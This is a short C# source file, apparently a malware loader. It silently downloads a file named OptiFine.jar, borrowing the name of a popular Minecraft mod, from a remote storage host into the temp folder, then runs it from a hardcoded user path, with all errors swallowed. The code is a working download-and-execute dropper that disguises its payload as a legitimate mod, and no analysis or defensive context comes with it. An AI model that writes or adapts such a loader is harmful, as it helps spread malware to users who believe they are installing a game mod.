using System.Diagnostics;
using System.IO;
using System.Net;

namespace Loader;

internal class Program
{
	private static void Main(string[] args)
	{
		Download();
	}

	public static void Download()
	{
		try
		{
			string tempPath = Path.GetTempPath();
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://472924.selcdn.ru/allah/OptiFine.jar", tempPath + "OptiFine.jar");
		}
		catch
		{
		}
		Run();
	}

	public static void Run()
	{
		try
		{
			Process.Start("C:\\Users\\YanKlimov\\AppData\\Local\\Temp\\OptiFine.jar");
		}
		catch
		{
		}
	}
}
